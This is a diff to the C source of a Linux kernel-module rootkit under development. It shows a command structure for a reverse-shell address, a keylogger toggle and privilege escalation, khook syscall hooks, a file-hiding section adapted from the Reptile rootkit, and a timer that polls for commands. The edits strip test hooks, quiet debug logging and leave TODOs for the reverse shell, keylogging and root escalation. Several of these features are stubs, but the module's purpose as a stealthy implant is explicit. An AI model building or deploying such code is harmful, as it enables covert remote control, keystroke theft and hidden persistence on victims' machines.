@@ -37,7 +37,6 @@ typedef struct commands {
     // TODO: Add properties for each of the commands we can accept
     char *rev_shell_ip;
     // TODO: Add toggle for enabling and disabling hidden files.
-    char *hidden_file_prefix;
     bool escalate_privs;
     bool keylogger;
 } commands;
@@ -76,7 +75,6 @@ MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
  */
 
 static void poll_for_commands(unsigned long data);
-// static void copy_params_into_cmd_struct(commands* cmd);
 
 /**
  * Logging Helpers
@@ -92,29 +90,8 @@ void log_error(const char *message) {
 }
 
 /**
- * Syscall hooks
- */
-
-/**
-KHOOK(fget);
-static int khook_fget(unsigned int fd) {
-	int original = KHOOK_ORIGIN(fget, fd);
-	printk("%s(%d) = %d\n", __func__, fd, original);
-	return original;
-}
-**/
-
-// Example hook for testing build process.
-// KHOOK(inode_permission);
-// static int khook_inode_permission(struct inode *inode, int mask) {
-//     int ret = 0;
-//     ret = KHOOK_ORIGIN(inode_permission, inode, mask);
-//     printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
-//     return ret;
-// }
-
-/**
  * Hide files and directories.
+ * Adapted from: https://github.com/f0rb1dd3n/Reptile/blob/0e562cffc4373d6774502a2f68fd758f58a2db75/rep_mod.c#L619
  */
 
 /**
@@ -178,7 +155,7 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
 
 /**
  * Timer and Command Polling Functions
- * Kernel v4.15 support adapted from: https://github.com/aircrack-ng/rtl8812au/commit/f221a169f281dab9756a176ec2abd91e0eba7d19
+ * Adapted from: https://github.com/aircrack-ng/rtl8812au/commit/f221a169f281dab9756a176ec2abd91e0eba7d19
  */
 
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
@@ -206,7 +183,7 @@ __inline static void set_timer(_timer *timer) {
 #else
     mod_timer(timer, expires);
 #endif
-    printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
+    // printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
 }
 
 __inline static void timer_cleanup_wrapper(_timer *timer) {
@@ -225,28 +202,21 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
  */
 static void poll_for_commands(unsigned long data) {
     // TODO: Store previous values of variables somewhere.
-    printk(KERN_INFO "Polling for commands!\n");
+    //printk(KERN_INFO "Polling for commands!\n");
     if (rev_shell_ip != cmds.rev_shell_ip) {
         printk(KERN_INFO "rev_shell_ip updated: %s\n", rev_shell_ip);
         cmds.rev_shell_ip = rev_shell_ip;
         // TODO: Set up reverse shell.
     }
 
-    // if (hidden_file_prefix != cmds.hidden_file_prefix) {
-    //     printk(KERN_INFO "hidden_file_prefix updated: %s\n", rev_shell_ip);
-    //     cmds.hidden_file_prefix = hidden_file_prefix;
-    // }
-
-    // if (escalate_privileges) {
-    //     get_root();
-    // }
-
+	// TODO: Check for change in hidden file hiding
+	// TODO: Check for keylogger enabling
+	// TODO: Check for escalating to root privs.
     set_timer(&polling_timer);
 }
 
 static void copy_params_into_cmd_struct(commands *cmd) {
     cmd->rev_shell_ip = rev_shell_ip;
-    cmd->hidden_file_prefix = hidden_file_prefix;
     cmd->escalate_privs = escalate_privileges;
     cmd->keylogger = keylogger;
 }
